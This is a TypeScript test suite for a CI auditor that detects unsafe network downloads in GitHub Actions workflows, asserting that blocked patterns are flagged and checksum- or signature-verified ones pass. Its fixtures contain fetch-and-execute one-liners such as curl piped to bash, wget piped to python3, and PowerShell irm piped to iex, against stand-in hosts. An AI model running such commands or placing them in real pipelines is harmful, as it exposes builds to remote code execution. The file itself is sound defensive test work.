import assert from 'node:assert/strict';
import test from 'node:test';
import { auditWorkflowNetworkProvenance } from './workflow-network-provenance-audit.mts';
import { fixtureInventory, type FixtureFileInput } from './test-helpers.mts';

function audit(text: string) {
  return auditWorkflowNetworkProvenance(fixtureInventory([{ path: '.github/workflows/network.yml', text }] as readonly FixtureFileInput[]));
}

function workflow(on: string, run: string, permissions = 'contents: read'): string {
  const body = run.split('\n').map(line => `          ${line}`).join('\n');
  return `name: network\non: ${on}\npermissions:\n  ${permissions}\njobs:\n  fetch:\n    runs-on: ubuntu-latest\n    steps:\n      - name: fetch\n        run: |\n${body}\n`;
}

test('accepts ordinary HTTPS metadata download that is not executed', () => {
  const result = audit(workflow('[push]', 'curl -fsSL https://example.test/data.json -o data.json\nnode -e "console.log(\'done\')"'));
  assert.equal(result.findings.some(item => item.id === 'ci-network-unverified-downloaded-executable'), false);
  assert.equal(result.summary.networkSteps, 1);
});

test('blocks curl pipe to bash', () => {
  const result = audit(workflow('[push]', 'curl -fsSL https://example.test/install.sh | bash'));
  const finding = result.findings.find(item => item.id === 'ci-network-direct-remote-execution');
  assert.equal(finding?.severity, 'critical');
  assert.equal(finding?.blocking, true);
});

test('blocks wget pipe to python interpreter', () => {
  const result = audit(workflow('[push]', 'wget -qO- https://example.test/bootstrap.py | python3'));
  assert.ok(result.findings.some(item => item.id === 'ci-network-direct-remote-execution'));
});

test('blocks PowerShell Invoke-RestMethod pipe to Invoke-Expression', () => {
  const result = audit(workflow('[push]', 'irm https://example.test/install.ps1 | iex'));
  assert.ok(result.findings.some(item => item.id === 'ci-network-direct-remote-execution' && item.blocking));
});

test('blocks plaintext HTTP download', () => {
  const result = audit(workflow('[push]', 'curl -fsSL http://example.test/tool -o tool'));
  assert.ok(result.findings.some(item => item.id === 'ci-network-insecure-http-download'));
});

test('plaintext HTTP becomes blocking in privileged job', () => {
  const result = audit(workflow('[push]', 'curl -fsSL http://example.test/tool -o tool\ngh release upload v1 tool', 'contents: write'));
  const finding = result.findings.find(item => item.id === 'ci-network-insecure-http-download');
  assert.equal(finding?.severity, 'critical');
  assert.equal(finding?.blocking, true);
});

test('blocks event-controlled download URL on pull request', () => {
  const result = audit(workflow('[pull_request]', 'curl -fsSL "https://${{ github.event.pull_request.title }}/tool" -o tool'));
  const finding = result.findings.find(item => item.id === 'ci-network-dynamic-download-origin');
  assert.equal(finding?.severity, 'critical');
  assert.equal(finding?.blocking, true);
});

test('blocks workflow input selecting download origin', () => {
  const result = audit(workflow('[workflow_dispatch]', 'wget "${{ inputs.url }}" -O tool'));
  assert.ok(result.findings.some(item => item.id === 'ci-network-dynamic-download-origin'));
});

test('flags mutable latest release URL', () => {
  const result = audit(workflow('[push]', 'curl -fsSL https://example.test/releases/latest/download/tool -o tool'));
  assert.ok(result.findings.some(item => item.id === 'ci-network-mutable-latest-download'));
});

test('blocks downloaded shell script execution without verification', () => {
  const result = audit(workflow('[push]', 'curl -fsSL https://example.test/v1/install.sh -o install.sh\nbash install.sh'));
  assert.ok(result.findings.some(item => item.id === 'ci-network-unverified-downloaded-executable'));
});

test('blocks downloaded binary made executable without verification', () => {
  const result = audit(workflow('[push]', 'curl -fsSL https://example.test/v1/tool -o tool\nchmod +x tool\n./tool --version'));
  assert.ok(result.findings.some(item => item.id === 'ci-network-unverified-downloaded-executable'));
});

test('accepts downloaded script verified before execution', () => {
  const result = audit(workflow('[push]', "curl -fsSL https://example.test/v1/install.sh -o install.sh\necho '0123456789abcdef  install.sh' > checksums.txt\nsha256sum -c checksums.txt\nbash install.sh"));
  assert.equal(result.findings.some(item => item.id === 'ci-network-unverified-downloaded-executable'), false);
});

test('accepts cosign verified binary before execution', () => {
  const result = audit(workflow('[push]', 'curl -fsSL https://example.test/v1/tool -o tool\ncosign verify-blob tool --signature tool.sig --certificate tool.pem\nchmod +x tool\n./tool'));
  assert.equal(result.findings.some(item => item.id === 'ci-network-unverified-downloaded-executable'), false);
});

test('supports wget output-document syntax', () => {
  const result = audit(workflow('[push]', 'wget --output-document=tool https://example.test/v1/tool\nchmod +x tool\n./tool'));
  assert.ok(result.findings.some(item => item.id === 'ci-network-unverified-downloaded-executable'));
});

test('supports PowerShell OutFile and execution', () => {
  const result = audit(workflow('[push]', 'Invoke-WebRequest https://example.test/v1/tool.ps1 -OutFile tool.ps1\npwsh tool.ps1'));
  assert.ok(result.findings.some(item => item.id === 'ci-network-unverified-downloaded-executable'));
});

test('reports signal counts deterministically', () => {
  const result = audit(workflow('[pull_request]', 'curl -fsSL http://${{ inputs.host }}/tool -o tool\nbash tool'));
  assert.equal(result.summary.networkSteps, 1);
  assert.equal(result.summary.insecureDownloads, 1);
  assert.equal(result.summary.dynamicDownloads, 1);
  assert.equal(result.summary.unverifiedExecutedDownloads, 1);
});

test('does not inspect non-workflow YAML', () => {
  const result = auditWorkflowNetworkProvenance(fixtureInventory([{ path: 'config/network.yml', text: 'run: curl http://bad.test | bash' }] as readonly FixtureFileInput[]));
  assert.equal(result.summary.workflowFiles, 0);
  assert.deepEqual(result.findings, []);
});
